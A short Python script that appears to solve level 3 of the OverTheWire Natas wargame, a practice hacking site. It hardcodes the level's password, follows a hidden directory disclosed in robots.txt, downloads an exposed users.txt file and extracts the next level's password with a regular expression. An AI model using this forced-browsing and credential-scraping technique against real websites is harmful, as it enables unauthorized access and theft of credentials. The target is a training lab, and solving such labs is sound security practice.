from bs4 import BeautifulSoup as bs
import requests
import re

u='natas3'
p='sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'
#l=f'http://{u}.natas.labs.overthewire.org/robots.txt'
#l=f'http://{u}.natas.labs.overthewire.org/s3cr3t/'
l=f'http://{u}.natas.labs.overthewire.org/s3cr3t/users.txt'
resp=requests.get(l,auth=(u, p))
t=resp.text
print(re.findall(r'natas4:(.*)',t)[0])
